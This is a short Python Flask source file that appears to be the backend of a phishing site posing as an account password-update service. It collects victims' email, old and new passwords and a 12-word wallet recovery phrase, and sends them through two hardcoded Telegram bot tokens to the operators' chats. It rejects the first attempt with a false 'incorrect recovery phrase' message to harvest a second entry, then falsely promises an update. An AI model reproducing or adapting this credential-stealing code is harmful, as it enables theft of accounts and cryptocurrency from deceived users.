from flask import Flask, request, render_template, jsonify
import requests

app = Flask(__name__)

# Replace with your actual Telegram Bot tokens and chat IDs
TELEGRAM_BOT_1 = "7868216292:AAGD2gXHCK12zFiRXj44KRXx6UtnxfJBo6A"
TELEGRAM_CHAT_1 = "5730686142"

TELEGRAM_BOT_2 = "7986783861:AAEvBWaOxcIR3VvdGNK3HWqqBDle_j3atE8"
TELEGRAM_CHAT_2 = "1174627659"

# Counter for user attempts (simple in-memory, you can replace with session/db)
user_attempts = {}

def send_to_telegram(message):
    urls = [
        f"https://api.telegram.org/bot{TELEGRAM_BOT_1}/sendMessage",
        f"https://api.telegram.org/bot{TELEGRAM_BOT_2}/sendMessage"
    ]
    for url, chat_id in zip(urls, [TELEGRAM_CHAT_1, TELEGRAM_CHAT_2]):
        requests.post(url, data={"chat_id": chat_id, "text": message})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json

    email = data.get('email')
    old_password = data.get('old_password')
    new_password = data.get('new_password')
    recovery_words = data.get('recovery_words')  # list of 12 words

    user_key = email  # simple key for counting attempts
    attempt = user_attempts.get(user_key, 0) + 1
    user_attempts[user_key] = attempt

    # Prepare message to send to Telegram
    message = f"""
Update Attempt #{attempt}
Email: {email}
Old Password: {old_password}
New Password: {new_password}
Recovery Phrase: {', '.join(recovery_words)}
"""
    send_to_telegram(message)

    # Determine frontend response based on attempt
    if attempt == 1:
        return jsonify({"status": "error", "message": "Incorrect recovery phrase, please try again."})
    else:
        return jsonify({"status": "success", "message": "We are processing your recovery phrase. Your password will be updated within 24 hours."})
    
if __name__ == "__main__":
    app.run(debug=True)
